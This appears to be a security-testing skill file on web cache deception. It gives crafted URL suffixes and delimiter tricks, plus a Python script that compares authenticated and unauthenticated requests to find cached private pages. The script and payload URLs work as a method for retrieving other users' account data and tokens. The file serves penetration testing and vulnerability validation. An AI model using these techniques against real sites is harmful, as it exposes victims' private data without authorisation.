---
name: cache_deception
description: Web cache deception - path confusion, delimiter discrepancy, authenticated response caching, attacker retrieval of victim data
---

# Web Cache Deception

Web cache deception (WCD) is the inverse of cache poisoning: instead of injecting a malicious response, the attacker tricks the cache into storing an authenticated victim's sensitive response, then retrieves it unauthenticated. The attack exploits how servers and caches disagree on which paths are "cacheable static content."

## Attack Model

```
1. Attacker crafts a URL that looks like static content to the cache
2. Tricks victim into visiting that URL (social engineering)
3. Cache stores the authenticated page response (misidentified as static)
4. Attacker requests the same URL unauthenticated → receives victim's cached data
```

## Path Mapping Discrepancy

The core technique: append a fake static suffix to a dynamic URL path.

```
# Victim visits:
https://example.com/account/profile/nonexistent.css

# Web server (Apache/Nginx):
→ No such file exists → falls back to routing → serves /account/profile
→ Response contains: {"name":"Victim","email":"victim@corp.com","token":"sk-..."}

# Cache (CDN):
→ Sees .css extension → caches it (CSS is static, right?)

# Attacker requests same URL (unauthenticated):
GET /account/profile/nonexistent.css HTTP/1.1
→ X-Cache: HIT → victim's private profile returned
```

### Targeted Cacheable Extensions

```
.css  .js  .jpg  .jpeg  .png  .gif  .ico  .svg  .woff  .woff2  .ttf
.map  .json  .xml  .txt  .html  .htm
```

## Delimiter Discrepancy

Servers and caches parse URL delimiters differently:

```
# Semicolon delimiter
# Java EE / Spring treat ";" as path parameter delimiter (ignored)
# Some caches strip everything after ";"
GET /account/profile;cache_me.css

# Web server sees: /account/profile → serves dynamic content
# Cache sees: /account/profile;cache_me.css → unknown extension → cache by rules → caches .css

# Null byte
GET /account/profile%00.css
# Some servers stop at %00 → serve /account/profile
# Some caches use full path with .css to determine cacheability

# Dot + query hybrid
GET /account/profile?.css
GET /account/profile#.css          # fragment only in browser
GET /account/profile%23.css        # encoded fragment, server sees it
```

### Path Normalization

```
# Double-encoded slash bypass
GET /account%2fprofile/..%2fprofile.css
→ Server normalizes to /account/profile
→ Cache sees /profile.css extension

# Trailing path component
GET /account/profile/.css
GET /account/profile/x.css
GET /account/profile/whatever.js
```

## Static Directory Pollution

```
# If /static/ is entirely cache-forward:
# Test if dynamic pages are accessible via static path tricks:
GET /static/../account/balance.json
# Some configs serve static/ from root, but routing still applies
```

## Full Attack Flow

```python
import requests

TARGET = "https://example.com"
VICTIM_COOKIE = "session=VICTIM_SESSION_VALUE"
ENDPOINTS = ["/account/profile", "/api/user/me", "/dashboard", "/account/settings"]

def test_wcd(endpoint, suffix):
    attack_url = f"{TARGET}{endpoint}/x{suffix}"
    
    # Step 1: Victim request (authenticated)
    victim_r = requests.get(attack_url,
                            headers={"Cookie": VICTIM_COOKIE},
                            verify=False)
    cache1 = victim_r.headers.get("X-Cache", "")
    
    if victim_r.status_code != 200:
        return None
    
    # Step 2: Attacker retrieves (unauthenticated)
    attacker_r = requests.get(attack_url, verify=False)
    cache2 = attacker_r.headers.get("X-Cache", "")
    
    if cache2 == "HIT" and any(s in attacker_r.text for s in ["email", "token", "balance", "name"]):
        return {
            "url": attack_url,
            "cache_status": f"{cache1} → {cache2}",
            "sensitive_data": attacker_r.text[:500]
        }
    return None

for ep in ENDPOINTS:
    for suffix in [".css", ".js", ".jpg", ".png", ";.css", "%00.css", "?.js"]:
        result = test_wcd(ep, suffix)
        if result:
            print(f"[VULNERABLE] {result}")
```

## Distinguishing WCD from Cache Poisoning

| WCD | Cache Poisoning |
|-----|----------------|
| Attacker tricks victim into visiting URL | Attacker poisons cache directly |
| No payload injection needed | Requires injecting malicious content |
| Attacker retrieves victim's own data | Attacker serves malicious content to all |
| Requires social engineering | Can be fully remote |

## Cache Header Analysis

```python
def check_cache_behavior(url, session_cookie=None):
    headers = {}
    if session_cookie:
        headers['Cookie'] = session_cookie
    
    r = requests.get(url, headers=headers, verify=False)
    
    cache_headers = {
        'X-Cache': r.headers.get('X-Cache'),
        'Cache-Control': r.headers.get('Cache-Control'),
        'Vary': r.headers.get('Vary'),
        'CDN-Cache-Control': r.headers.get('CDN-Cache-Control'),
        'CF-Cache-Status': r.headers.get('CF-Cache-Status'),
    }
    
    # If Vary: Cookie is NOT set on dynamic pages → cache ignores auth!
    if 'Cookie' not in (cache_headers.get('Vary') or ''):
        print(f"[!] Vary header doesn't include Cookie — auth state ignored in cache key!")
    
    return cache_headers
```

## Validation Approach

1. Identify sensitive authenticated endpoints (profile, balance, tokens)
2. Append static extensions to each: `/profile/x.css`, `/profile;x.css`
3. Make authenticated request → confirm 200 + sensitive data returned
4. Make unauthenticated request to same URL → `X-Cache: HIT` + data present = vulnerable
5. Document: victim request proxy ID → attacker request proxy ID → captured data (redact PII in report, describe what type of data was accessible)

## Tools

- `Web-Cache-Vulnerability-Scanner` (PortSwigger) — automated WCD detection
- `cachebuster.py` — custom suffix permutation testing
- Manual two-request sequence with proxy capturing both
